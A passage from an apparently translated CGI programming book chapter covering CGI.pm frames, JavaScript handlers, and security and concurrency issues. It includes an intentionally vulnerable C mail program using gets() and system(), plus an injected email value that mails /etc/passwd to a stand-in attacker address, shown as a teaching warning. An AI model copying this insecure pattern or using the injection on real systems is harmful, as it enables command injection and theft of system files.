
`print $cgi->header(-target=>'\_myFrame');`

- 使用 `start_form()` 方法将帧的名称作为 `-target` 参数的参数：

`print $cgi->start_form(-target=>'another_frame');`

- 由于很好地使用帧可能困难，将程序拆分为逻辑部分通常是最佳选择。例如，如果页面有多个帧，让程序的一个部分创建帧，并让程序的独立部分处理每个帧可能是最好的。

## JavaScript

JavaScript 是一种运行在浏览器内部的实用解释型语言。它在 Netscape 2 版本中作为 "LiveScript" 被引入，但它的名称几乎被更改为 JavaScript，并使其看起来与 Java 相似。

在客户端执行代码是很棒的，特别是对于 CGI 而言，因为你可以在客户端执行表单验证等任务，强制将面向用户界面的任务在客户端处理（这是它应该所在的地方），而不是在你的服务器上处理（那里不属于它）。

再次，使用 CGI.pm 的 JavaScript 功能要求你了解 JavaScript。JavaScript 事件仅在适用的情况下可用。

要向 HTML 元素注册 JavaScript 事件处理程序，只需命名相应的参数，并在调用 CGI 方法时传递你需要的任何参数即可。例如，如果你想在用户对文本字段内容进行更改时立即验证其内容，可以这样做：

```
print $q->textfield( -name=>'height',
 -onChange=>"validateHeight(this)");
```

当然，为了让这种方法生效，`validateHeight()` 必须是一个已存在的函数。你通过将其包含在 `<script>` 标签中使其现有化。

## 安全与数据并发问题

如果你使用 `system()` 函数，必须小心地编写程序，以防止输入数据被执行。

代码列表 20.1 所示的简单 CGI 程序存在严重的安全问题。这个非常简单的程序执行了一项简单任务：它只是根据电子邮件地址向用户发送几行文本。

**代码列表 20.1. 简单的发送邮件 CGI 程序。**

```c
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

int main ()
{
  char address[128], fname[128], command[128];
  FILE *tempfile;
  strcpy(fname , tmpnam(NULL));
  tempfile = fopen (fname, "w"); /* 创建临时文件 */
  if (tempfile == NULL) /* 错误 - 未创建文件 */
  {
    printf("Internal failure #1 please report %d\n", errno);
    exit (1);
  }
  fprintf(tempfile, "Thank you very much for caring about our cause\n");
  fprintf(tempfile, "this letter is just to tell you how much we\n");
  fprintf(tempfile, "really think you are wonderful for caring.\n\n");
  fprintf(tempfile, "Sincerely,\n\n");
  fprintf(tempfile, "Jane Doe, Executive Thanker\n");
  fclose (tempfile);
  gets(address); /* 读取电子邮件地址 */
  sprintf(command, "mail -s \"thanks for caring\" %s < %s\n", address, fname); /* 创建命令 */
  system (command); /* 执行命令 */
  remove (fname); /* 清理 */
  exit (0);
}
```

如果用户输入正确的电子邮件地址，一切运行正常。但如果用户决定故意刁难，将电子邮件地址输入为 `myname@myaddress.com ; mail cracker@hiding.out < /etc/passwd`，那么你的密码文件就会发送到 `cracker@hiding.out`。

**注意：** 列表 20.1 中显示的示例做了多处错误。最严重的是它使用固定长度的数组来存储用户的电子邮件。确保你的数组能够包含所有可能输入的数据。用户可能通过输入非常长的电子邮件（超过 127 个字符）导致此程序失败。你应该验证 `CONTENT_LENGTH` 和 `CONTENT_TYPE`。你也可以结合 `malloc()` 使用 `CONTENT_LENGTH` 来动态分配足够的空间来容该字符串。记住为空终止符留出一个额外的字节。

本章中的其他示例使用了动态内存，以确保来自浏览器的数据不会溢出！

**注：** 所有的代码列表都包含在 CD-ROM 中，文件名格式为 `lst20_*nn*.*typ*`，其中 `*nn*` 是列表编号（`01` 到 `12`），`*typ*` 是文件类型（`htm`、`c` 或 `txt`）。在使用示例时，你必须更改 CD-ROM 上的文件名（或将 HTML 代码更改为 `lst20_*nn*.*typ*` 名称）。在使用服务器使用它们时，你可能还需要更改 URL。

电子邮件地址安全问题无论你使用何种工具来开发 CGI 脚本都可能是一个问题。请参见第 19 节“使用 Perl 开发 CGI”，获取更多关于安全的示例和建议。

通常情况下，当你交互式运行一个程序时，你是该目录下唯一使用它的人（即使它是共享可执行文件）。但是，当你有一个 CGI 时，许多人可以在你的目录中并发执行它。你现在不能使用虚拟名称（`temp1`、`temp2` 等）创建临时文件了，而是必须确保名称是唯一的。一种很好的技术是使用进程 ID（process id），因为操作系统保证它是唯一的。使用 `tmpnam()` 函数是另一种方法，但在高负载并发使用下，你也会遇到它产生问题。

此外，在写入或更新文件时必须小心。当程序按串行执行（一次一个）时，这个过程很容易。当它并发执行时，你就有问题了。使用 C/C++ 程序相比 shell 脚本的巨大优势之一是锁定记录或文件的能力。大多数系统都拥有支持文件锁定的函数。数据库管理系统通常支持锁定单个记录（或行）的能力。

当 shell 脚本（或程序）执行频率较低时，你可以使用锁文件（用于标记特定文件当前正在使用的特殊文件）。但当每秒可能有数百或数千次文件访问时，这种方法变得不可行——由于处理负载以及多个进程能够更改文件的概率（锁机制失效）。如果你不想为文件锁定编写代码，可以使用许多处理程序，将表单内容作为邮件发送给用户，而不是尝试将用户的输入附加到文件中。
